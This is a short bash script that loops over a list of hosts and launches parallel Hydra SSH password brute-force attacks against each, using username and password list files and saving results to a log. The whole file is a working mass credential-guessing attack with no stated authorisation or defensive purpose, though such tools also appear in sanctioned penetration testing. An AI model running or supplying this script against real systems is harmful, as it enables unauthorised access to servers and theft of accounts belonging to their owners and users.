#!/bin/bash

while read line; do
	hydra -I -L users.txt -P pwd.txt -t 4 -vV -o save.log $line ssh &
done < hosts.txt
